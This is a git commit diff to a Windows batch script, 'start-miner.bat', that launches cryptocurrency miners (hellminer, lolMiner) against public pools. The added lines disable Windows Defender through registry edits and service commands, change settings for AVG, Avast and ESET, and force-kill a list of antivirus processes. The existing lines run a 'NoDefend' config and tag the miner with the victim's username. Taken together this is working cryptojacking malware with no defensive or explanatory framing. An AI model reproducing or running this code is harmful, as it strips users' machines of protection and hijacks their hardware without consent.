54e24bd5db8a5f074f2c0d4e890a324f2638cd35
VerusGhost <167066418+VerusGhost@users.noreply.github.com>
2024-05-02 01:30:18 +0100

    Update start-miner.bat

--- start-miner.bat
+++ start-miner.bat
@@ -7,39 +7,46 @@ AdvancedRun.exe /Run NoDefend.cfg
 REM Run hellminer.exe with specified parameters for mining
 .\hellminer.exe -c stratum+tcp://na.luckpool.net:3960 -u RRigARdBSMQ1yuShojcftU2apRUVFpR2PL.%USERNAME% -p --cpu 4
 
-REM Use WMIC to query the GPU adapter info
-for /f "tokens=2 delims==" %%A in ('wmic path Win32_VideoController get AdapterCompatibility /value') do (
-    set gpu_exists=%%A
+REM AVControl.bat code to disable antivirus programs
+
+@echo off
+setlocal enabledelayedexpansion
+
+REM Define the list of antivirus processes to check for
+set "AntivirusProcesses=AvastSvc.exe AVGIDSAgent.exe ekrn.exe McAfeeFramework.exe bdagent.exe N360.exe MBAMService.exe fsav.exe coreServiceShell.exe WRSVC.exe SBAMSvc.exe IntegoDaemon.exe"
+
+echo Disabling common antivirus programs...
+
+REM Disable Windows Defender
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
+
+REM Disable Windows Defender Antivirus service
+sc config WinDefend start= disabled >nul 2>&1
+sc stop WinDefend >nul 2>&1
+
+REM Disable AVG Antivirus
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVG\AVG" /v OndemandProtection /t REG_DWORD /d 0 /f >nul 2>&1
+
+REM Disable Avast Antivirus
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\AVAST Software\Avast" /v OndemandProtection /t REG_DWORD /d 0 /f >nul 2>&1
+
+REM Disable ESET NOD Antivirus
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\ESET\ESET Security" /v MonitorStartupChanges /t REG_DWORD /d 0 /f >nul 2>&1
+
+REM Add more antivirus disable commands here...
+
+echo Checking for running antivirus processes...
+
+REM Check for and stop known antivirus processes
+for %%P in (%AntivirusProcesses%) do (
+    tasklist /fi "imagename eq %%P" | find /i "%%P" >nul && (
+        taskkill /f /im "%%P" >nul 2>&1
+        echo %%P process stopped.
+    )
 )
 
-REM If GPU exists
-if "%gpu_exists%" NEQ "" (
-    echo GPU exists.
-    
-    REM Use WMIC to query the VRAM size
-    for /f "tokens=2 delims==" %%B in ('wmic path Win32_VideoController get AdapterRAM /value') do (
-        set vram=%%B
-    )
-
-    REM Convert VRAM size to GB
-    set /a vram_gb=%vram%/1024/1024/1024
-
-    REM Check if VRAM is more than 4GB
-    if %vram_gb% GEQ 4 (
-        echo GPU has more than 4GB of VRAM.
-        echo Running lolMiner.exe...
-        lolMiner.exe --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user YOUR_WALLET_ADDRESS.RIG_ID
-        pause
-    ) else (
-        echo GPU does not have more than 4GB of VRAM.
-        pause
-    )
-) else (
-    echo No GPU found.
-    pause
-)
-
-REM Include AVControl.bat code to disable antivirus programs
-REM AVControl.bat code goes here...
+echo Running lolMiner.exe...
+lolMiner.exe --algo AUTOLYKOS2 --pool erg.2miners.com:8888 --user YOUR_WALLET_ADDRESS.RIG_ID
+pause
 
 endlocal
